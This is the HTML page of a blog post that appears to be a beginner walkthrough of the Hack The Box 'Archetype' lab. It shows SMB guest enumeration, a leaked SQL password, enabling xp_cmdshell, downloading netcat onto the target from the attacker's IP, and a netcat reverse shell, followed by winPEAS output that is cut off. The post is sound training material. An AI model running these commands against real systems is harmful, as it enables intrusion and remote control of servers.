<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>HTB - Archetype - Walkthrough | Ee-Vah?</title><meta name=keywords content="htb,walkthrough,archetype,tier-2,free-tier,network,protocols,mssql,smb,impacket,powershell,reconnaissance,remote-code-execution,clear-text-credentials,information-disclosure,anonymous-access,guest-access,windows-target,easy-box,user-own,system-own"><meta name=description content="The aim of this walkthrough is to provide help with the Archetype machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.
It belongs to a series of tutorials that aim to help out complete beginners with finishing the Starting Point TIER 2 challenges.
SETUP There are a couple of ways to connect to the target machine."><meta name=author content="bluewalle"><link rel=canonical href=https://bluewalle.github.io/posts/walkthroughs/htb/starting-point/tier_2/archetype/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe+FVUFzPh7U=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://bluewalle.github.io/main/img/favicon.png><link rel=icon type=image/png sizes=16x16 href=https://bluewalle.github.io/main/img/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://bluewalle.github.io/main/img/favicon-32x32.png><link rel=apple-touch-icon href=https://bluewalle.github.io/main/img/apple-touch-icon.png><link rel=mask-icon href=https://bluewalle.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-123-45","auto"),ga("send","pageview"))</script><meta property="og:title" content="HTB - Archetype - Walkthrough"><meta property="og:description" content="The aim of this walkthrough is to provide help with the Archetype machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.
It belongs to a series of tutorials that aim to help out complete beginners with finishing the Starting Point TIER 2 challenges.
SETUP There are a couple of ways to connect to the target machine."><meta property="og:type" content="article"><meta property="og:url" content="https://bluewalle.github.io/posts/walkthroughs/htb/starting-point/tier_2/archetype/"><meta property="og:image" content="https://bluewalle.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-05-11T08:00:00+00:00"><meta property="article:modified_time" content="2023-05-11T08:00:00+00:00"><meta property="og:site_name" content="Just Keep Swimming"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://bluewalle.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="HTB - Archetype - Walkthrough"><meta name=twitter:description content="The aim of this walkthrough is to provide help with the Archetype machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.
It belongs to a series of tutorials that aim to help out complete beginners with finishing the Starting Point TIER 2 challenges.
SETUP There are a couple of ways to connect to the target machine."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://bluewalle.github.io/posts/"},{"@type":"ListItem","position":2,"name":"HTB - Archetype - Walkthrough","item":"https://bluewalle.github.io/posts/walkthroughs/htb/starting-point/tier_2/archetype/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HTB - Archetype - Walkthrough","name":"HTB - Archetype - Walkthrough","description":"The aim of this walkthrough is to provide help with the Archetype machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.\nIt belongs to a series of tutorials that aim to help out complete beginners with finishing the Starting Point TIER 2 challenges.\nSETUP There are a couple of ways to connect to the target machine.","keywords":["htb","walkthrough","archetype","tier-2","free-tier","network","protocols","mssql","smb","impacket","powershell","reconnaissance","remote-code-execution","clear-text-credentials","information-disclosure","anonymous-access","guest-access","windows-target","easy-box","user-own","system-own"],"articleBody":"The aim of this walkthrough is to provide help with the Archetype machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.\nIt belongs to a series of tutorials that aim to help out complete beginners with finishing the Starting Point TIER 2 challenges.\nSETUP There are a couple of ways to connect to the target machine. The one we will be using throughout this walkthrough is via the provided pwnbox.\nOnce our connection is taken care of, we spawn the target machine.\nAdditionally - even though not required - it is possible to set a local variable (only available in the current shell) containing our target host’s IP address. Once set, we can easily access it by prepending a $ to our variable name.\n┌─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $rhost= ┌─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $ echo $rhost ┌─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $ We could use the unset command to remove it after we no longer need it.\n┌─[✗]─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $unset rhost ┌─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $ TASK 1 Question: Which TCP port is hosting a database server?\nWe start our recon with a quick connection check.\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-9swjmh1jnx]─[~/archetype] └──╼ [★]$ ping $rhost -c 4 PING 10.129.63.163 (10.129.63.163) 56(84) bytes of data. 64 bytes from 10.129.63.163: icmp_seq=1 ttl=127 time=12.0 ms 64 bytes from 10.129.63.163: icmp_seq=2 ttl=127 time=11.4 ms 64 bytes from 10.129.63.163: icmp_seq=3 ttl=127 time=11.7 ms 64 bytes from 10.129.63.163: icmp_seq=4 ttl=127 time=11.4 ms --- 10.129.63.163 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 3005ms rtt min/avg/max/mdev = 11.352/11.636/12.018/0.265 ms ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-9swjmh1jnx]─[~/archetype] └──╼ [★]$ Then we follow up on it with scanning the top 1000 tcp ports(version and script scan).\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-9swjmh1jnx]─[~/archetype] └──╼ [★]$ nmap -sC -sV $rhost Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-11 14:33 BST Nmap scan report for 10.129.63.163 Host is up (0.057s latency). Not shown: 996 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds 1433/tcp open ms-sql-s Microsoft SQL Server 2017 14.00.1000.00; RTM |_ssl-date: 2023-05-11T13:33:22+00:00; +1s from scanner time. |_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug) | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback | Not valid before: 2023-05-11T13:25:34 |_Not valid after: 2053-05-11T13:25:34 |_ms-sql-info: ERROR: Script execution failed (use -d to debug) Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 1h45m01s, deviation: 3h30m00s, median: 0s | smb-os-discovery: | OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3) | Computer name: Archetype | NetBIOS computer name: ARCHETYPE\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2023-05-11T06:33:14-07:00 | smb2-security-mode: | 311: |_ Message signing enabled but not required | smb2-time: | date: 2023-05-11T13:33:16 |_ start_date: N/A | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 16.32 seconds ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-9swjmh1jnx]─[~/archetype] └──╼ [★]$ Four ports are reported to be open on our target. Additionally, there are some other interesting pieces of information to take note of:\nOS:Microsoft Windows sql server running on tcp port 1433 guest login is enabled for port 445 (smb) Let us capitalize on this information.\n1433\nTASK 2 Question: What is the name of the non-Administrative share available over SMB?\nUsing the guest username (guest-access) and listing the shares available on smb will directs us toward the backups share.\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-9swjmh1jnx]─[~/archetype] └──╼ [★]$ smbclient -U guest -L $rhost Password for [WORKGROUP\\guest]: Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin backups Disk C$ Disk Default share IPC$ IPC Remote IPC SMB1 disabled -- no workgroup available ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-9swjmh1jnx]─[~/archetype] └──╼ [★]$ backups\nTASK 3 Question: What is the password identified in the file on the SMB share?\nAccessing the share and listing it’s contents brings us to the - prod.dtsConfig - file.\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-9swjmh1jnx]─[~/archetype] └──╼ [★]$ smbclient -U guest \\\\\\\\$rhost\\\\backups Password for [WORKGROUP\\guest]: Try \"help\" to get a list of possible commands. smb: \\\u003e ls . D 0 Mon Jan 20 12:20:57 2020 .. D 0 Mon Jan 20 12:20:57 2020 prod.dtsConfig AR 609 Mon Jan 20 12:23:02 2020 5056511 blocks of size 4096. 2531250 blocks available smb: \\\u003e get prod.dtsConfig getting file \\prod.dtsConfig of size 609 as prod.dtsConfig (12.1 KiloBytes/sec) (average 12.1 KiloBytes/sec) smb: \\\u003e exit After the download is finished, opening it on our local machine will bring us a nice surprise.\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-9swjmh1jnx]─[~/archetype] └──╼ [★]$ cat prod.dtsConfig Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False; ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-9swjmh1jnx]─[~/archetype] └──╼ [★]$ Even though it looks like some configuration file, there are some potential credentials hidden there.\npotential credentials host ARCHETYPE username sql_svc password M3g4c0rp123 But since proper recon is always the key, we make sure to check out the other shares too, even if they do not look that interesting at first sight.\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-9swjmh1jnx]─[~/archetype] └──╼ [★]$ smbclient -U guest \\\\\\\\$rhost\\\\ADMIN$ Password for [WORKGROUP\\guest]: tree connect failed: NT_STATUS_ACCESS_DENIED ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-9swjmh1jnx]─[~/archetype] └──╼ [★]$ smbclient -U guest \\\\\\\\$rhost\\\\IPC$ Password for [WORKGROUP\\guest]: Try \"help\" to get a list of possible commands. smb: \\\u003e ls NT_STATUS_NO_SUCH_FILE listing \\* smb: \\\u003e exit ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-9swjmh1jnx]─[~/archetype] └──╼ [★]$ We were right, nothing interesting there. But still, it never hurts to check.\nM3g4c0rp123\nTASK 4 Question: What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?\nOnce we have Impacket installed, using the tab-autocomplete feature can help us out.\n─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-9swjmh1jnx]─[~/archetype] └──╼ [★]$ impacket- impacket-addcomputer impacket-lookupsid impacket-rpcmap impacket-atexec impacket-mimikatz impacket-sambaPipe impacket-dcomexec impacket-mqtt_check impacket-samrdump impacket-dpapi impacket-mssqlclient impacket-secretsdump impacket-esentutl impacket-mssqlinstance impacket-services impacket-exchanger impacket-netview impacket-smbclient impacket-findDelegation impacket-nmapAnswerMachine impacket-smbexec impacket-GetADUsers impacket-ntfs-read impacket-smbrelayx impacket-getArch impacket-ntlmrelayx impacket-smbserver impacket-GetNPUsers impacket-ping impacket-sniff impacket-getPac impacket-ping6 impacket-sniffer impacket-getST impacket-psexec impacket-split impacket-getTGT impacket-raiseChild impacket-ticketConverter impacket-GetUserSPNs impacket-rdp_check impacket-ticketer impacket-goldenPac impacket-reg impacket-wmiexec impacket-karmaSMB impacket-registry-read impacket-wmipersist impacket-kintercept impacket-rpcdump impacket-wmiquery ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-9swjmh1jnx]─[~/archetype] └──╼ [★]$ impacket- Therefore, it will come down to these noteworthy fellows:\nimpacket-mssqlclient impacket-mssqlinstance Checking them both out should make our choice quite easy.\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-9swjmh1jnx]─[~/archetype] └──╼ [★]$ impacket-mssqlclient --help Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra usage: mssqlclient.py [-h] [-port PORT] [-db DB] [-windows-auth] [-debug] [-file FILE] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address] target TDS client implementation (SSL supported). positional arguments: target [[domain/]username[:password]@] optional arguments: -h, --help show this help message and exit -port PORT target MSSQL port (default 1433) -db DB MSSQL database instance (default None) -windows-auth whether or not to use Windows Authentication (default False) -debug Turn DEBUG output ON -file FILE input file with commands to execute in the SQL shell authentication: -hashes LMHASH:NTHASH NTLM hashes, format is LMHASH:NTHASH -no-pass don't ask for password (useful for -k) -k Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line -aesKey hex key AES key to use for Kerberos Authentication (128 or 256 bits) -dc-ip ip address IP Address of the domain controller. If ommited it use the domain part (FQDN) specified in the target parameter ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-9swjmh1jnx]─[~/archetype] └──╼ [★]$ ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-9swjmh1jnx]─[~/archetype] └──╼ [★]$impacket-mssqlinstance --help Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra usage: mssqlinstance.py [-h] [-timeout TIMEOUT] host Asks the remote host for its running MSSQL Instances. positional arguments: host target host optional arguments: -h, --help show this help message and exit -timeout TIMEOUT timeout to wait for an answer ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-9swjmh1jnx]─[~/archetype] └──╼ [★]$ Since we already have the credentials, let’s try and connect to it. It is important to note, that without the -windows-auth optional argument our connection will not work.\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-9swjmh1jnx]─[~/archetype] └──╼ [★]$ impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@$rhost -windows-auth Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra [*] Encryption required, switching to TLS [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192 [*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'. [*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english. [*] ACK: Result: 1 - Microsoft SQL Server (140 3232) [!] Press help for extra shell commands SQL\u003e mssqlclient.py\nTASK 5 Question: What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?\nUsing the built-in help command in our authenticated sql session should shine a light on our answer.\nSQL\u003e help lcd {path} - changes the current local directory to {path} exit - terminates the server process (and this session) enable_xp_cmdshell - you know what it means disable_xp_cmdshell - you know what it means xp_cmdshell {cmd} - executes cmd using xp_cmdshell sp_start_job {cmd} - executes cmd using the sql server agent (blind) ! {cmd} - executes a local shell cmd SQL\u003e Trying to get some more information about what the xp_cmdshell command exactly does is a bust, but it does provide us with some further hints.\nSQL\u003e xp_cmdshell help [-] ERROR(ARCHETYPE): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online. SQL\u003e Breaking it down, it looks like it wanted to directly run the help as a command, but it was stopped, because the feature is not yet turned on. Enabling it sounds like a good idea, so let’s try it.\nenable_xp_cmdshell [*] INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install. [*] INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install. SQL\u003e Great, it looks like it actually worked and we could turn it on. Let’s try and run whoami and see if it runs.\nSQL\u003e xp_cmdshell whoami output ----------------- archetype\\sql_svc NULL SQL\u003e Wow, it worked. But where are we exactly?\nSQL\u003e xp_cmdshell echo %cd% output ------------------- C:\\Windows\\system32 NULL SQL\u003e What else can we run? Can we just grab the user flag from here directly?\nSQL\u003e xp_cmdshell \"powershell cat C:\\Users\\sql_svc\\Desktop\\user.txt\" output -------------------------------- NULL SQL\u003e Actually, we can and we just did. But communicating with our target this way (via the interactive sql shell) is quite cumbersome. So our next course of action should be to get a reverse shell on the target.\nIn a nutshell, it could look something like this:\nmaking netcat binary available on lhost (local machine) using the interactive sql terminal to download this binary to the target machine creating a netcat listener on lhost runing the netcat binary on the target via the interactive sql shell to connect back to lhost So let’s start with #1: Our first action should be to download the windows netcat binary (nc64.exe) and store it on our local machine.\nRunning the server module from the http pyhton package (in the same directory) will start a local server and make all the files in that directory accessible.\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-9swjmh1jnx]─[~/archetype] └──╼ [★]$ ll total 48K -rw-r--r-- 1 htb-bluewalle htb-bluewalle 45K May 11 16:20 nc64.exe ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-9swjmh1jnx]─[~/archetype] └──╼ [★]$ python -m http.server 4444 Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ... Continuing with #2: We go back to our interactive sql shell. Then we try downloading the binary using both powershell and wget (previously alias for Invoke-WebRequest).\nOur first attempt is to download the file (from our current directory) and then save it to - C:\\Users\\sql_svc\\Downloads - (where we have write access), but we get an error…\nSQL\u003e xp_cmdshell \"powershell -c wget http://10.10.14.46:4444/nc64.exe -outfile C:\\Users\\sql_svc\\Downloads\" output -------------------------------------------------------------------------------- wget : Access to the path 'C:\\Users\\sql_svc\\Downloads' is denied. At line:1 char:1 + wget http://10.10.14.46:4444/nc64.exe -outfile C:\\Users\\sql_svc\\Downl ... + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : NotSpecified: (:) [Invoke-WebRequest], UnauthorizedAccessException + FullyQualifiedErrorId : System.UnauthorizedAccessException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand NULL SQL\u003e In our second attempt, we first head to - C:\\Users\\sql_svc\\Downloads - and only after we changed directory, do we try to download the binary.\nSQL\u003e xp_cmdshell \"powershell -c cd C:\\Users\\sql_svc\\Downloads; wget http://10.10.14.46:4444/nc64.exe -outfile nc64.exe\" output ------ NULL SQL\u003e This time we are successful and our binary is located at - C:\\Users\\sql_svc\\Downloads\\nc64.exe -.\nSQL\u003e xp_cmdshell \"powershell -c ls C:\\Users\\sql_svc\\Downloads\" output -------------------------------------------------------------------------------- NULL NULL Directory: C:\\Users\\sql_svc\\Downloads NULL NULL Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 5/11/2023 8:57 AM 45272 nc64.exe NULL NULL NULL SQL\u003e We shut down the http server right after the download has finished.\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-9swjmh1jnx]─[~/archetype] └──╼ [★]$ python -m http.server 4444 Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ... 10.129.63.163 - - [11/May/2023 16:56:39] \"GET /nc64.exe HTTP/1.1\" 200 - 10.129.63.163 - - [11/May/2023 16:57:33] \"GET /nc64.exe HTTP/1.1\" 200 - ^C Keyboard interrupt received, exiting. ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-9swjmh1jnx]─[~/archetype] └──╼ [★]$ Now for #3: It’s time to start our listener.\n# on lhost ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-9swjmh1jnx]─[~/archetype] └──╼ [★]$ nc -lvnp 4444 Ncat: Version 7.93 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Finally (#4): We try to run the netcat binary on the target and instruct it to connect back to our local machine.\nSQL\u003e xp_cmdshell \"powershell -c cd C:\\Users\\sql_svc\\Downloads; .\\nc64.exe -e cmd.exe 10.10.14.46 4444\" No output here. Did it work…? Once we head over to the listener from #3, we will see that we got a reverse shell back. So it actually worked.\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-9swjmh1jnx]─[~/archetype] └──╼ [★]$ nc -lvnp 4444 Ncat: Version 7.93 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.129.63.163. Ncat: Connection from 10.129.63.163:49680. Microsoft Windows [Version 10.0.17763.2061] (c) 2018 Microsoft Corporation. All rights reserved. C:\\Users\\sql_svc\\Downloads\u003e Let’s use our new (and much better) connection to grab the user flag (again).\nC:\\Users\\sql_svc\\Downloads\u003ewhoami whoami archetype\\sql_svc C:\\Users\\sql_svc\\Downloads\u003ecd ..\\Desktop\\ cd ..\\Desktop\\ C:\\Users\\sql_svc\\Desktop\u003edir dir Volume in drive C has no label. Volume Serial Number is 9565-0B4F Directory of C:\\Users\\sql_svc\\Desktop 01/20/2020 06:42 AM . 01/20/2020 06:42 AM .. 02/25/2020 07:37 AM 32 user.txt 1 File(s) 32 bytes 2 Dir(s) 10,711,236,608 bytes free C:\\Users\\sql_svc\\Desktop\u003etype user.txt type user.txt C:\\Users\\sql_svc\\Desktop\u003e xp_cmdshell\nTASK 6 Question: What script can be used in order to search possible paths to escalate privileges on Windows hosts?\nOne of the most commonly used scripts for privilege escalation on windows is winpeas.\nLet bring it over to our target. We go through the same motions as before:\npyhton http server where the file is located at - lhost use powershell and wget to copy it over - rhost Since winpeas is already downloaded to pwnbox, locating it seems like the only thing still left for us to do. It might take some time, but it can be found at\n/opt/useful/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASexe/binaries/x64/Release/winPEASx64.exe Then, we copy it over to our working directory.\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-9swjmh1jnx]─[/opt/useful/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASexe/binaries/x64/Release] └──╼ [★]$ cp winPEASx64.exe ~/archetype/ ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-9swjmh1jnx]─[/opt/useful/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASexe/binaries/x64/Release] └──╼ [★]$ Once there, we head over and start our http server.\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-9swjmh1jnx]─[/opt/useful/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASexe/binaries/x64/Release] └──╼ [★]$ cd ~/archetype/ ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-9swjmh1jnx]─[~/archetype] └──╼ [★]$ python -m http.server 4444 Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ... Then we use our reverse shell to download it to rhost.\nC:\\Users\\sql_svc\\Downloads\u003epowershell -c wget http://10.10.14.46:4444/winPEASx64.exe -outfile winPEASx64.exe powershell -c wget http://10.10.14.46:4444/winPEASx64.exe -outfile winPEASx64.exe C:\\Users\\sql_svc\\Downloads\u003e Once downloaded, we close up the http server.\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-9swjmh1jnx]─[~/archetype] └──╼ [★]$ python -m http.server 4444 Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ... 10.129.63.163 - - [11/May/2023 18:06:33] \"GET /winPEASx64.exe HTTP/1.1\" 200 - ^C Keyboard interrupt received, exiting. ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-9swjmh1jnx]─[~/archetype] └──╼ [★]$ All that’s left for us is to run it.\nC:\\Users\\sql_svc\\Downloads\u003epowershell -c .\\winPEASx64.exe powershell -c .\\winPEASx64.exe ANSI color bit for Windows is not set. If you are execcuting this from a Windows terminal inside the host you should run 'REG ADD HKCU\\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD *((,.,/((((((((((((((((((((/, */ ,/*,..*((((((((((((((((((((((((((((((((((, ,*/((((((((((((((((((/, .*//((//**, .*(((((((* ((((((((((((((((**********/########## .(* ,((((((( (((((((((((/********************/####### .(. ((((((( ((((((..******************/@@@@@/***/###### ./((((((( ,,....********************@@@@@@@@@@(***,#### .//(((((( , ,..********************/@@@@@%@@@@/********##((/ /(((( ..((###########*********/%@@@@@@@@@/************,,..(((( .(##################(/******/@@@@@/***************.. /(( .(#########################(/**********************..*(( .(##############################(/*****************.,((( .(###################################(/************..((( .(#######################################(*********..((( .(#######(,.***.,(###################(..***.*******..((( .(#######*(#####((##################((######/(*****..((( .(###################(/***********(##############(...((( .((#####################/*******(################.(((((( .(((############################################(..(((( ..(((##########################################(..((((( ....((########################################( .((((( ......((####################################( .(((((( (((((((((#################################(../(((((( (((((((((/##########################(/..(((((( (((((((((/,. ,*//////*,. ./(((((((((((((((. (((((((((((((((((((((((((((((/ ADVISORY: winpeas should be used for authorized penetration testing and/or educational purposes only.Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission. WinPEASng by @carlospolopm, makikvues(makikvues2[at]gmail[dot]com) /---------------------------------------------------------------------------\\ | Do you like PEASS? | |---------------------------------------------------------------------------| | Become a Patreon : https://www.patreon.com/peass | | Follow on Twitter : @carlospolopm | | Respect on HTB : SirBroccoli \u0026 makikvues | |---------------------------------------------------------------------------| | Thank you! | \\---------------------------------------------------------------------------/ [+] Legend: Red Indicates a special privilege over an object or something is misconfigured Green Indicates that some protection is enabled or something is well configured Cyan Indicates active users Blue Indicates disabled users LightYellow Indicates links � You can find a Windows local PE Checklist here: https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation Creating Dynamic lists, this could take a while, please wait... - Loading YAML definitions file... - Checking if domain... - Getting Win32_UserAccount info... - Creating current user groups list... - Creating active users list (local only)... - Creating disabled users list... - Admin users list... - Creating AppLocker bypass list... - Creating files/directories list for search... �����������������������������������͹ System Information ������������������������������������� ����������͹ Basic System Information � Check if the Windows versions is vulnerable to some known exploit https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#kernel-exploits Hostname: Archetype ProductName: Windows Server 2019 Standard EditionID: ServerStandard ReleaseId: 1809 BuildBranch: rs5_release CurrentMajorVersionNumber: 10 CurrentVersion: 6.3 Architecture: AMD64 ProcessorCount: 2 SystemLang: en-US KeyboardLang: English (United States) TimeZone: (UTC-08:00) Pacific Time (US \u0026 Canada) IsVirtualMachine: True Current Time: 5/11/2023 10:08:59 AM HighIntegrity: False PartOfDomain: False Hotfixes: KB5004335, KB5003711, KB5004244, [?] Windows vulns search powered by Watson(https://github.com/rasta-mouse/Watson) [*] OS Version: 1809 (17763) [*] Enumerating installed KBs... [!] CVE-2019-0836 : VULNERABLE [\u003e] https://exploit-db.com/exploits/46718 [\u003e] https://decoder.cloud/2019/04/29/combinig-luafv-postluafvpostreadwrite-race-condition-pe-with-diaghub-collector-exploit-from-standard-user-to-system/ [!] CVE-2019-0841 : VULNERABLE [\u003e] https://github.com/rogue-kdc/CVE-2019-0841 [\u003e] https://rastamouse.me/tags/cve-2019-0841/ [!] CVE-2019-1064 : VULNERABLE [\u003e] https://www.rythmstick.net/posts/cve-2019-1064/ [!] CVE-2019-1130 : VULNERABLE [\u003e] https://github.com/S3cur3Th1sSh1t/SharpByeBear [!] CVE-2019-1253 : 